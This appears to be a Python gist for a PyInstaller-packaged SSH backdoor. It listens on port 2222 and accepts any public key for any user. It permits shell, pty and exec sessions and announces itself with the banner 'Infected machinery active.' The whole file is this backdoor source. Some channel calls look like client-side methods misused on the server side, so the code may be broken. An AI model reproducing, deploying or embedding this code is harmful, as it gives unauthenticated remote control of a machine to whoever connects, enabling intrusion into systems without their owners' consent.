#date: 2023-11-14T16:47:03Z
#url: https://api.github.com/gists/2eff0e41b78c8e149baaecfdeb5cfa85
#owner: https://api.github.com/users/GamePlayer-8

import sys
import os
import threading
import subprocess
import logging
import socket
import asyncio
import requests
import paramiko

### PyInstaller patch ###
os.chdir(getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))))
sys.path.append(os.getcwd())
PYBIN = sys.executable

if getattr(sys, 'frozen', False):
    EXECUTABLE = sys.executable
else:
    EXECUTABLE = __file__
#######

logger = logging.getLogger()
logger.setLevel(logging.INFO)

handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

def load_keys(directory=f'{os.getcwd()}/keys/'):
    # Load keys from `keys/` builtin dir
    keys = []
    for filename in os.listdir(directory):
        private_key_file = os.path.join(directory, filename)
        if os.path.isfile(private_key_file):
            keys += [paramiko.RSAKey.from_private_key_file(private_key_file)]
        else:
            keys += load_keys(private_key_file)    
    return keys

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        self.banner = "Infected machinery active."

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return 'publickey'

    def check_channel_shell_request(self, channel):
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_exec_request(self, channel, command):
        return True

def listener():
    logger.info('Socket (re)activated.')
    keys = load_keys()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', 2222))

        sock.listen(100)
        client, addr = sock.accept()
        with client:
            with paramiko.Transport(client) as t:
                t.set_gss_host(socket.getfqdn(""))
                t.set_subsystem_handler("sftp", paramiko.SFTPServer, paramiko.SFTPAttributes)
                t.load_server_moduli()
                for k in keys:
                    t.add_server_key(k)
                server = Server()
                t.start_server(server=server)
                with t.accept(20) as channel:
                    channel.get_pty(term='vt100')
                    channel.invoke_shell()
                    channel.send('bash -c "echo Hello World"\n')
            logger.info('end listener')

def run_server():
    while True:
        try:
            listener()
        except KeyboardInterrupt:
            sys.exit(0)
        except Exception as exc:
            logger.error(exc)

def run_in_thread():
    thread = threading.Thread(target=run_server)
    thread.start()

if __name__ == '__main__':
    run_in_thread()
